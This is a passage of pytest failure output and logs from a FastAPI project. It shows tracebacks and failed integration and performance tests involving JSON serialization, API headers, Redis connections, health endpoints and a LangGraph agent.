                                   ~~~~~~~~~~~~~~~~~~^^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py", line 162, in __exit__
    self.gen.throw(value)
    ~~~~~~~~~~~~~~^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_utils.py", line 82, in collapse_excgroups
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 175, in __call__
    response = await self.dispatch_func(request, call_next)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette_prometheus/middleware.py", line 57, in dispatch
    raise e from None
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette_prometheus/middleware.py", line 53, in dispatch
    response = await call_next(request)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 153, in call_next
    raise app_exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 140, in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/exceptions.py", line 62, in __call__
    await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
    await app(scope, receive, sender)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/routing.py", line 714, in __call__
    await self.middleware_stack(scope, receive, send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/routing.py", line 734, in app
    await route.handle(scope, receive, send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/routing.py", line 288, in handle
    await self.app(scope, receive, send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/routing.py", line 76, in app
    await wrap_app_handling_exceptions(app, request)(scope, receive, send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
    await app(scope, receive, sender)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/routing.py", line 73, in app
    response = await f(request)
               ^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/fastapi/routing.py", line 301, in app
    raw_response = await run_endpoint_function(
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    ...<3 lines>...
    )
    ^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/fastapi/routing.py", line 212, in run_endpoint_function
    return await dependant.call(**values)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/slowapi/extension.py", line 734, in async_wrapper
    response = await func(*args, **kwargs)  # type: ignore
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/app/api/v1/standards.py", line 107, in get_detailed_health
    return JSONResponse(
        content=APIResponseFormatter.format_success_response(
    ...<4 lines>...
        status_code=status_code
    )
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/responses.py", line 182, in __init__
    super().__init__(content, status_code, headers, media_type, background)
    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/responses.py", line 45, in __init__
    self.body = self.render(content)
                ~~~~~~~~~~~^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/responses.py", line 185, in render
    return json.dumps(
           ~~~~~~~~~~^
        content,
        ^^^^^^^^
    ...<3 lines>...
        separators=(",", ":"),
        ^^^^^^^^^^^^^^^^^^^^^^
    ).encode("utf-8")
    ^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/__init__.py", line 238, in dumps
    **kw).encode(obj)
          ~~~~~~^^^^^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/encoder.py", line 200, in encode
    chunks = self.iterencode(o, _one_shot=True)
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/encoder.py", line 261, in iterencode
    return _iterencode(o, 0)
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/encoder.py", line 180, in default
    raise TypeError(f'Object of type {o.__class__.__name__} '
                    f'is not JSON serializable')
TypeError: Object of type datetime is not JSON serializable
ERROR    app.core.logging:main.py:278 [2m2025-07-05T14:22:33.491196Z[0m [[31m[1merror    [0m] [1minternal_server_error         [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35mtestclient[0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Object of type datetime is not JSON serializable'[0m [36mfilename[0m=[35mmain.py[0m [36mfunc_name[0m=[35minternal_server_error_handler[0m [36mlineno[0m=[35m278[0m [36mmethod[0m=[35mGET[0m [36mmodule[0m=[35mmain[0m [36mpath[0m=[35m/api/v1/standards/health/detailed[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/main.py[0m
Traceback (most recent call last):
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/errors.py", line 165, in __call__
    await self.app(scope, receive, _send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/cors.py", line 85, in __call__
    await self.app(scope, receive, send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 173, in __call__
    with recv_stream, send_stream, collapse_excgroups():
                                   ~~~~~~~~~~~~~~~~~~^^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py", line 162, in __exit__
    self.gen.throw(value)
    ~~~~~~~~~~~~~~^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_utils.py", line 82, in collapse_excgroups
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 175, in __call__
    response = await self.dispatch_func(request, call_next)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/app/core/middleware.py", line 151, in dispatch
    response = await call_next(request)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 153, in call_next
    raise app_exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 140, in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 173, in __call__
    with recv_stream, send_stream, collapse_excgroups():
                                   ~~~~~~~~~~~~~~~~~~^^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py", line 162, in __exit__
    self.gen.throw(value)
    ~~~~~~~~~~~~~~^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_utils.py", line 82, in collapse_excgroups
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 175, in __call__
    response = await self.dispatch_func(request, call_next)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/app/core/middleware.py", line 58, in dispatch
    response = await call_next(request)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 153, in call_next
    raise app_exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 140, in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 173, in __call__
    with recv_stream, send_stream, collapse_excgroups():
                                   ~~~~~~~~~~~~~~~~~~^^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py", line 162, in __exit__
    self.gen.throw(value)
    ~~~~~~~~~~~~~~^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_utils.py", line 82, in collapse_excgroups
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 175, in __call__
    response = await self.dispatch_func(request, call_next)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/app/core/cache_middleware.py", line 95, in dispatch
    response = await call_next(request)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 153, in call_next
    raise app_exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 140, in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 173, in __call__
    with recv_stream, send_stream, collapse_excgroups():
                                   ~~~~~~~~~~~~~~~~~~^^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py", line 162, in __exit__
    self.gen.throw(value)
    ~~~~~~~~~~~~~~^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_utils.py", line 82, in collapse_excgroups
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 175, in __call__
    response = await self.dispatch_func(request, call_next)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/app/core/response_optimization.py", line 53, in dispatch
    response = await call_next(request)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 153, in call_next
    raise app_exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 140, in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
  File "/home/paul/boardroom-repo/app/core/api_standards.py", line 70, in __call__
    await self.app(scope, receive, send_wrapper)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 173, in __call__
    with recv_stream, send_stream, collapse_excgroups():
                                   ~~~~~~~~~~~~~~~~~~^^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py", line 162, in __exit__
    self.gen.throw(value)
    ~~~~~~~~~~~~~~^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_utils.py", line 82, in collapse_excgroups
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 175, in __call__
    response = await self.dispatch_func(request, call_next)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette_prometheus/middleware.py", line 57, in dispatch
    raise e from None
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette_prometheus/middleware.py", line 53, in dispatch
    response = await call_next(request)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 153, in call_next
    raise app_exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/base.py", line 140, in coro
    await self.app(scope, receive_or_disconnect, send_no_error)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/middleware/exceptions.py", line 62, in __call__
    await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
    await app(scope, receive, sender)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/routing.py", line 714, in __call__
    await self.middleware_stack(scope, receive, send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/routing.py", line 734, in app
    await route.handle(scope, receive, send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/routing.py", line 288, in handle
    await self.app(scope, receive, send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/routing.py", line 76, in app
    await wrap_app_handling_exceptions(app, request)(scope, receive, send)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
    raise exc
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
    await app(scope, receive, sender)
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/routing.py", line 73, in app
    response = await f(request)
               ^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/fastapi/routing.py", line 301, in app
    raw_response = await run_endpoint_function(
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    ...<3 lines>...
    )
    ^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/fastapi/routing.py", line 212, in run_endpoint_function
    return await dependant.call(**values)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/slowapi/extension.py", line 734, in async_wrapper
    response = await func(*args, **kwargs)  # type: ignore
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/app/api/v1/standards.py", line 107, in get_detailed_health
    return JSONResponse(
        content=APIResponseFormatter.format_success_response(
    ...<4 lines>...
        status_code=status_code
    )
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/responses.py", line 182, in __init__
    super().__init__(content, status_code, headers, media_type, background)
    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/responses.py", line 45, in __init__
    self.body = self.render(content)
                ~~~~~~~~~~~^^^^^^^^^
  File "/home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/starlette/responses.py", line 185, in render
    return json.dumps(
           ~~~~~~~~~~^
        content,
        ^^^^^^^^
    ...<3 lines>...
        separators=(",", ":"),
        ^^^^^^^^^^^^^^^^^^^^^^
    ).encode("utf-8")
    ^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/__init__.py", line 238, in dumps
    **kw).encode(obj)
          ~~~~~~^^^^^
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/encoder.py", line 200, in encode
    chunks = self.iterencode(o, _one_shot=True)
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/encoder.py", line 261, in iterencode
    return _iterencode(o, 0)
  File "/home/paul/.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/json/encoder.py", line 180, in default
    raise TypeError(f'Object of type {o.__class__.__name__} '
                    f'is not JSON serializable')
TypeError: Object of type datetime is not JSON serializable
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:22:33.493794Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35mtestclient[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Internal server error'[0m [36merror_type[0m=[35minternal_server_error[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/v1/standards/health/detailed[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
______________ TestAPIConsistency.test_error_response_consistency ______________
tests/integration/test_api_standards.py:188: in test_error_response_consistency
    assert response.status_code == 401
E   assert 403 == 401
E    +  where 403 = <Response [403 Forbidden]>.status_code
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:redis_service.py:242 [2m2025-07-05T14:22:33.750525Z[0m [[31m[1merror    [0m] [1mredis_get_failed              [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Event loop is closed'[0m [36mfilename[0m=[35mredis_service.py[0m [36mfunc_name[0m=[35mget[0m [36mkey[0m=[35mapi_cache:GET:/api/v1/chatbot/messages:anonymous:-4183630851185173271[0m [36mlineno[0m=[35m242[0m [36mmodule[0m=[35mredis_service[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/redis_service.py[0m
WARNING  app.core.logging:middleware.py:181 [2m2025-07-05T14:22:33.751033Z[0m [[33m[1mwarning  [0m] [1mvalidation_error              [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35mtestclient[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mmiddleware.py[0m [36mfunc_name[0m=[35mvalidation_error_handler[0m [36mlineno[0m=[35m181[0m [36mmethod[0m=[35mGET[0m [36mmodule[0m=[35mmiddleware[0m [36mpath[0m=[35m/api/v1/chatbot/messages[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/middleware.py[0m [36mstatus_code[0m=[35m403[0m
_________________ TestAPIConsistency.test_cors_headers_present _________________
tests/integration/test_api_standards.py:223: in test_cors_headers_present
    assert "access-control-allow-origin" in response.headers
E   AssertionError: assert 'access-control-allow-origin' in Headers({'allow': 'POST', 'content-length': '31', 'content-type': 'application/json', 'x-request-id': '5c262464-a789-4357-9024-fdc4ff8015c3', 'x-api-version': '0.01', 'x-response-time': '0', 'x-cache-status': 'MISS', 'x-original-size': '31', 'x-compressed-size': '31'})
E    +  where Headers({'allow': 'POST', 'content-length': '31', 'content-type': 'application/json', 'x-request-id': '5c262464-a789-4357-9024-fdc4ff8015c3', 'x-api-version': '0.01', 'x-response-time': '0', 'x-cache-status': 'MISS', 'x-original-size': '31', 'x-compressed-size': '31'}) = <Response [405 Method Not Allowed]>.headers
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:redis_service.py:242 [2m2025-07-05T14:22:33.763794Z[0m [[31m[1merror    [0m] [1mredis_get_failed              [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Event loop is closed'[0m [36mfilename[0m=[35mredis_service.py[0m [36mfunc_name[0m=[35mget[0m [36mkey[0m=[35mapi_cache:OPTIONS:/api/v1/auth/login:anonymous:-4183630851185173271[0m [36mlineno[0m=[35m242[0m [36mmodule[0m=[35mredis_service[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/redis_service.py[0m
________________ TestAPIVersioning.test_version_header_support _________________
tests/integration/test_api_standards.py:310: in test_version_header_support
    assert response.headers.get("x-api-version") == "1.0.0"
E   AssertionError: assert '0.01' == '1.0.0'
E     
E     - 1.0.0
E     + 0.01
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:redis_service.py:242 [2m2025-07-05T14:22:33.828555Z[0m [[31m[1merror    [0m] [1mredis_get_failed              [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Event loop is closed'[0m [36mfilename[0m=[35mredis_service.py[0m [36mfunc_name[0m=[35mget[0m [36mkey[0m=[35mapi_cache:e7182fdc6468a78af04ea4f718f24102[0m [36mlineno[0m=[35m242[0m [36mmodule[0m=[35mredis_service[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/redis_service.py[0m
_____________ TestAPIVersioning.test_unsupported_version_handling ______________
tests/integration/test_api_standards.py:319: in test_unsupported_version_handling
    assert response.headers.get("x-api-version") == "1.0.0"
E   AssertionError: assert '0.01' == '1.0.0'
E     
E     - 1.0.0
E     + 0.01
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:redis_service.py:242 [2m2025-07-05T14:22:33.836138Z[0m [[31m[1merror    [0m] [1mredis_get_failed              [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Event loop is closed'[0m [36mfilename[0m=[35mredis_service.py[0m [36mfunc_name[0m=[35mget[0m [36mkey[0m=[35mapi_cache:e7182fdc6468a78af04ea4f718f24102[0m [36mlineno[0m=[35m242[0m [36mmodule[0m=[35mredis_service[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/redis_service.py[0m
________________ TestHealthCheckService.test_redis_health_check ________________
tests/integration/test_health_checks.py:46: in test_redis_health_check
    assert result.service_name == "redis"
E   AssertionError: assert 'unknown' == 'redis'
E     
E     - redis
E     + unknown
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:redis_service.py:167 [2m2025-07-05T14:22:33.900601Z[0m [[31m[1merror    [0m] [1mredis_health_check_failed     [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Event loop is closed'[0m [36mfilename[0m=[35mredis_service.py[0m [36mfunc_name[0m=[35mhealth_check[0m [36mlineno[0m=[35m167[0m [36mmodule[0m=[35mredis_service[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/redis_service.py[0m
ERROR    app.core.logging:health_checks.py:216 [2m2025-07-05T14:22:33.900770Z[0m [[31m[1merror    [0m] [1mhealth_check_execution_failed [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m"Redis health check failed: {'status': 'unhealthy', 'last_check': 1751725353.900346, 'connection_pool_created': True, 'recent_errors': [{'timestamp': 1751725353.9005692, 'error': 'Event loop is closed'}], 'stats': {'hits': 3, 'misses': 17, 'sets': 1, 'deletes': 0, 'errors': 17, 'hit_rate': 0.15, 'total_operations': 21, 'uptime_seconds': 1.339928388595581}}"[0m [36mfilename[0m=[35mhealth_checks.py[0m [36mfunc_name[0m=[35m_timed_check[0m [36mlineno[0m=[35m216[0m [36mmodule[0m=[35mhealth_checks[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/health_checks.py[0m
________________ TestHealthEndpoints.test_basic_health_endpoint ________________
tests/integration/test_health_checks.py:229: in test_basic_health_endpoint
    async with AsyncClient(app=app, base_url="http://test") as client:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_________________ TestHealthEndpoints.test_readiness_endpoint __________________
tests/integration/test_health_checks.py:243: in test_readiness_endpoint
    async with AsyncClient(app=app, base_url="http://test") as client:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
__________________ TestHealthEndpoints.test_liveness_endpoint __________________
tests/integration/test_health_checks.py:257: in test_liveness_endpoint
    async with AsyncClient(app=app, base_url="http://test") as client:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
______________ TestHealthEndpoints.test_detailed_health_endpoint _______________
tests/integration/test_health_checks.py:271: in test_detailed_health_endpoint
    async with AsyncClient(app=app, base_url="http://test") as client:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
________________ TestHealthEndpoints.test_dependencies_endpoint ________________
tests/integration/test_health_checks.py:287: in test_dependencies_endpoint
    async with AsyncClient(app=app, base_url="http://test") as client:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
______________ TestHealthEndpoints.test_circuit_breakers_endpoint ______________
tests/integration/test_health_checks.py:300: in test_circuit_breakers_endpoint
    async with AsyncClient(app=app, base_url="http://test") as client:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
__________________ TestHealthEndpoints.test_metrics_endpoint ___________________
tests/integration/test_health_checks.py:314: in test_metrics_endpoint
    async with AsyncClient(app=app, base_url="http://test") as client:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
______ TestExternalAPIHealthCheck.test_external_api_health_check_success _______
tests/integration/test_health_checks.py:369: in test_external_api_health_check_success
    result = await health_service.check_external_api_health("test_api", "https://api.example.com/health")
E   AttributeError: 'HealthCheckService' object has no attribute 'check_external_api_health'
______ TestExternalAPIHealthCheck.test_external_api_health_check_failure _______
tests/integration/test_health_checks.py:382: in test_external_api_health_check_failure
    result = await health_service.check_external_api_health("test_api", "https://api.example.com/health")
E   AttributeError: 'HealthCheckService' object has no attribute 'check_external_api_health'
_________ TestLangGraphAgentPerformance.test_agent_initialization_time _________
tests/performance/test_ai_operations_performance.py:57: in test_agent_initialization_time
    assert agent.graph is not None
E   AttributeError: 'LangGraphAgent' object has no attribute 'graph'
________ TestLangGraphAgentPerformance.test_single_query_response_time _________
tests/performance/test_ai_operations_performance.py:65: in test_single_query_response_time
    response = await agent.chat(query)
E   AttributeError: 'LangGraphAgent' object has no attribute 'chat'
______ TestLangGraphAgentPerformance.test_concurrent_queries_performance _______
tests/performance/test_ai_operations_performance.py:86: in test_concurrent_queries_performance
    tasks = [agent.chat(query) for query in queries]
E   AttributeError: 'LangGraphAgent' object has no attribute 'chat'
_________ TestLangGraphAgentPerformance.test_memory_usage_single_query _________
tests/performance/test_ai_operations_performance.py:107: in test_memory_usage_single_query
    await agent.chat(query)
E   AttributeError: 'LangGraphAgent' object has no attribute 'chat'
______ TestLangGraphAgentPerformance.test_streaming_response_performance _______
tests/performance/test_ai_operations_performance.py:126: in test_streaming_response_performance
    async for chunk in agent.stream(query):
E   AttributeError: 'LangGraphAgent' object has no attribute 'stream'
_________ TestLangGraphAgentPerformance.test_chat_history_performance __________
tests/performance/test_ai_operations_performance.py:146: in test_chat_history_performance
    await agent.chat(f"Test message {i}")
E   AttributeError: 'LangGraphAgent' object has no attribute 'chat'
________ TestLangGraphAgentPerformance.test_sustained_load_performance _________
tests/performance/test_ai_operations_performance.py:166: in test_sustained_load_performance
    await agent.chat(f"Query {i}: What is the meeting status?")
E   AttributeError: 'LangGraphAgent' object has no attribute 'chat'
_______ TestAIOperationsLoadTesting.test_high_concurrency_ai_operations ________
tests/performance/test_ai_operations_performance.py:639: in test_high_concurrency_ai_operations
    tasks = [agent.chat(query) for _ in range(concurrent_requests)]
E   AttributeError: 'LangGraphAgent' object has no attribute 'chat'
_________ TestAIOperationsLoadTesting.test_sustained_load_performance __________
tests/performance/test_ai_operations_performance.py:695: in test_sustained_load_performance
    assert success_rate > 0.95  # 95% success rate
E   assert 0.0 > 0.95
________ TestAIOperationsLoadTesting.test_resource_exhaustion_handling _________
tests/performance/test_ai_operations_performance.py:720: in test_resource_exhaustion_handling
    tasks = [agent.chat("Resource exhaustion query") for _ in range(concurrent_requests)]
E   AttributeError: 'LangGraphAgent' object has no attribute 'chat'
__________ TestAIOperationsLoadTesting.test_memory_pressure_handling ___________
tests/performance/test_ai_operations_performance.py:770: in test_memory_pressure_handling
    await agent.chat(f"Memory pressure query {i}")
E   AttributeError: 'LangGraphAgent' object has no attribute 'chat'
___ TestDatabaseServicePerformance.test_database_initialization_performance ____
tests/performance/test_performance.py:339: in test_database_initialization_performance
    await service.initialize()
app/services/database.py:82: in initialize
    await self._test_connection()
app/services/database.py:98: in _test_connection
    async with self._engine.begin() as conn:
E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
------------------------------ Captured log call -------------------------------
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:40.533483Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 1 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:41.534555Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 2 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
